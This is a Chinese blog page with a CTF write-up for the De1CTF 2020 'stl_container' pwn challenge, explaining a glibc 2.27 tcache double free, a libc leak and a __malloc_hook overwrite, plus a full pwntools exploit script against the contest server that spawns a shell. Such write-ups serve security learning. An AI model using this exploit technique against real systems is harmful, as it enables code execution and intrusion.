@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon00.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这个比赛属实不是人打的，建议改名为MC-CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="De1CTF_2020 write up">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;index.html">
+<meta property="og:site_name" content="N0vice&#39;s Blog">
+<meta property="og:description" content="这个比赛属实不是人打的，建议改名为MC-CTF">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D2.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D5.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D6.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D7.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D9.png">
+<meta property="article:published_time" content="2020-05-04T09:41:34.000Z">
+<meta property="article:modified_time" content="2020-05-06T02:33:32.655Z">
+<meta property="article:author" content="N0vice">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;De1CTF-2020-write-up&#x2F;D1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/05/04/De1CTF-2020-write-up/"/>
+
+
+
+
+
+  <title>De1CTF_2020 write up | N0vice's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.1.0"></head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+<script src="/live2d-widget/autoload.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">N0vice's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/04/De1CTF-2020-write-up/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="N0vice">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="N0vice's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">De1CTF_2020 write up</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-04T17:41:34+08:00">
+                2020-05-04
+              </time>
+            
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这个比赛属实不是人打的，建议改名为MC-CTF<a id="more"></a>，wdnmd每个类型都有mc的题目，出题人记得签收刀片<br>开局先贴一张图且膜拜一波publicQi师傅，解那个code_runner写了五百多行代码，和别人交流从下午三点聊到早上5点<br><img src="D1.png" alt=""><br>而且比赛就没有点阳间的pwn，都是些什么玩意儿，属实给👴整吐了<br>一个C艹写的菜单堆，一个套十五六层逆向算法的mips，一个CVE，一个Vm-pwn，一个Android-pwn，这是人做的？？？<br><img src="D2.jpg" alt=""><br>我搞出来这题是和Theffth小姐姐一起做的，她leak了libc，我调出了getshell<br>stl_container是C艹写的菜单堆，glibc2.27，有4个功能，每个功能里面分别有三个功能，大概像这样<br><img src="D3.png" alt=""><br>然后C艹看不懂，IDA都不开，直接盲调，测试得到每个功能最多创建两个chunk，而且都是0xa0大小的，vector功能存在double free，因为是2.27，可以直接free同一块chunk两次<br>接着就是瞎jb调，然后发现，把tcache填满后，利用double free，就可以看到main_arena+96链进了unsorted bin，就可以leak libc了<br>具体操作如下<br>①将所有chunk都申请出来，然后全部free<br>②再次free vector中的chunk0，形成double free<br>就会看到，大概长这样<br><img src="D4.png" alt=""><br>③再瞎jb调一通，会发现，把queue和stack的chunk全部申请回来之后，再申请一个vector中的chunk0，show一下，就能leak出meain_arena+96的地址<br>大概长这样<br><img src="D5.jpg" alt=""><br>快乐！<br>接着，我的一开始思路是再次把tcache填满，然后可以用别的bin打一打，因为我不是很会tcache<br>④leak完后将queue和stack中的chunk都free了（这步为什么要这样做，我也不知道，反正不这样做就没法getshell）<br>⑤再次add一个vector中的chunk0，并free 0两次，构造double free<br>⑥add一个vector中的chunk1，并写入malloc_hook-0x13<br>然后就会惊奇的发现<br><img src="D6.png" alt=""><br>⑦再申请一个vector chunk，里面写one_gadget，就能add到已malloc_hook-0x13为地址的chunk并且把one_gadget写进malloc_hook去了<br>然后我调的时候没有x/gx，没显示完，大概长这样，我还以为只写入了一部分<br><img src="D7.png" alt=""><br>然后我还调了一波偏移，其实0x13的时候应该就已经写进去了<br><img src="D8.png" alt=""><br><img src="D9.png" alt=""><br>快乐！！！<br>exp  </p>
+<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
+<span class="comment">#coding=utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+<span class="keyword">import</span> sys
+<span class="comment">#context.log_level = 'debug'</span>
+context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
+binary = <span class="string">'./stl_container'</span> 
+local = <span class="number">0</span>
+<span class="keyword">if</span> local == <span class="number">1</span>:
+    p=process(binary)
+<span class="keyword">else</span>:
+    p=remote(<span class="string">"134.175.239.26"</span>,<span class="number">8848</span>)
+elf=ELF(binary)
+libc=ELF(<span class="string">"libc-2.27.so"</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">Ladd</span><span class="params">(content)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"data:"</span>)
+    p.send(content)
+<span class="function"><span class="keyword">def</span> <span class="title">vadd</span><span class="params">(content)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"2"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"data:"</span>)
+    p.send(content)
+<span class="function"><span class="keyword">def</span> <span class="title">qadd</span><span class="params">(content)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"3"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"data:"</span>)
+    p.send(content)
+<span class="function"><span class="keyword">def</span> <span class="title">sadd</span><span class="params">(content)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"4"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"data:"</span>)
+    p.send(content)
+<span class="function"><span class="keyword">def</span> <span class="title">Lfree</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"2"</span>)
+    p.recvuntil(<span class="string">"index?"</span>)
+    p.send(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">vfree</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"2"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"2"</span>)
+    p.recvuntil(<span class="string">"index?"</span>)
+    p.send(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">qfree</span><span class="params">()</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"3"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"2"</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">sfree</span><span class="params">()</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"4"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"2"</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">Lshow</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"3"</span>)
+    p.recvuntil(<span class="string">"index?"</span>)
+    p.send(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">vshow</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"2"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"3"</span>)
+    p.recvuntil(<span class="string">"index?"</span>)
+    p.send(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">qshow</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"3"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"3"</span>)
+    p.recvuntil(<span class="string">"index?"</span>)
+    p.send(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">sshow</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"4"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"3"</span>)
+    p.recvuntil(<span class="string">"index?"</span>)
+    p.send(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
+    Ladd(<span class="string">" "</span>) <span class="comment"># 0</span>
+    Ladd(<span class="string">" "</span>) <span class="comment"># 1</span>
+    vadd(<span class="string">" "</span>) <span class="comment"># 2</span>
+    vadd(<span class="string">" "</span>) <span class="comment"># 3</span>
+    qadd(<span class="string">" "</span>) <span class="comment"># 4</span>
+    qadd(<span class="string">" "</span>) <span class="comment"># 5</span>
+    sadd(<span class="string">" "</span>) <span class="comment"># 6</span>
+    sadd(<span class="string">" "</span>) <span class="comment"># 7</span>
+    Lfree(<span class="number">0</span>)
+    Lfree(<span class="number">1</span>)
+    vfree(<span class="number">0</span>)
+    vfree(<span class="number">1</span>)
+    qfree()
+    qfree()
+    sfree()
+    sfree()
+    vfree(<span class="number">0</span>)
+    qadd(<span class="string">" "</span>)
+    qadd(<span class="string">" "</span>)
+    sadd(<span class="string">" "</span>)
+    sadd(<span class="string">" "</span>)
+    vadd(<span class="string">" "</span>)
+    vshow(<span class="number">0</span>)
+
+    leak =  u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) 
+    libc_base = leak - <span class="number">0x3ebc20</span>
+    malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]
+    realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]
+    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
+    log.success(<span class="string">"malloc_hook==&gt;"</span> + hex(malloc_hook))
+    one_gadget = libc_base +   <span class="number">0x4f322</span>   
+    <span class="keyword">print</span> <span class="string">"one==&gt;"</span> + hex(one_gadget)
+    payload = p64(malloc_hook)
+    qfree()
+    qfree()
+    sfree()
+    sfree()
+
+    vadd(<span class="string">" "</span>)
+    vfree(<span class="number">0</span>)
+    vfree(<span class="number">0</span>)
+    vadd(p64(malloc_hook<span class="number">-0x16</span>))
+    payload = <span class="string">"a"</span> *<span class="number">0x16</span> + p64(one_gadget)
+    vadd(payload)
+    <span class="comment">#gdb.attach(p)</span>
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"&gt;&gt; "</span>)
+    p.send(<span class="string">"1"</span>)
+    p.sendline(<span class="string">"cat flag"</span>)
+    p.interactive()
+exp()</code></pre>
+<p>末尾贴上队内其他师傅搞出来的题目的wp链接：<br><a href="https://mp.weixin.qq.com/s/InqX2yJB7zIIgT7GEN2iow" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/InqX2yJB7zIIgT7GEN2iow</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的鼓励将支持我继续努力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="N0vice 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="N0vice 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    N0vice
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/05/04/De1CTF-2020-write-up/" title="De1CTF_2020 write up">http://yoursite.com/2020/05/04/De1CTF-2020-write-up/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/30/%E5%85%B3%E4%BA%8E%E7%9C%8B%E4%BA%86b%E7%AB%99%E8%B5%9B%E5%B0%94%E5%8F%B7%E8%A7%86%E9%A2%91%E4%B9%8B%E5%90%8E%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/" rel="next" title="关于看了b站赛尔号视频之后的一点思考">
+                <i class="fa fa-chevron-left"></i> 关于看了b站赛尔号视频之后的一点思考
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/09/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-force/" rel="prev" title="一道题学习house of force">
+                一道题学习house of force <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="N0vice" />
+            
+              <p class="site-author-name" itemprop="name">N0vice</p>
+              <p class="site-description motion-element" itemprop="description">从前我是瞎的，如今我看得见</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/N0vice21" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/luo-yu-piao" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-zhihu"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://spacey.top/" title="Elli0t" target="_blank">Elli0t</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ericdshen.com/" title="EDS" target="_blank">EDS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://migraine-sudo.github.io" title="Migraine" target="_blank">Migraine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shawroot.cc/" title="Root" target="_blank">Root</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.yuque.com/pi3ntn/azmee3" title="Lime" target="_blank">Lime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mrbelieve128.github.io/" title="Mr.Believe" target="_blank">Mr.Believe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://l0x1c.github.io/" title="L0x1c" target="_blank">L0x1c</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://binlep.top/" title="binlep" target="_blank">binlep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://1p0ch.cn/" title="1p0ch" target="_blank">1p0ch</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://retr0.vip/" title="Retr_0" target="_blank">Retr_0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hackerpoet.com/" title="T4rn" target="_blank">T4rn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/SopRomeo" title="penson" target="_blank">penson</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/lemon629/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://surager.pub/" title="5ur4g3r" target="_blank">5ur4g3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.snowywar.top/" title="snowywar" target="_blank">snowywar</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">N0vice</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
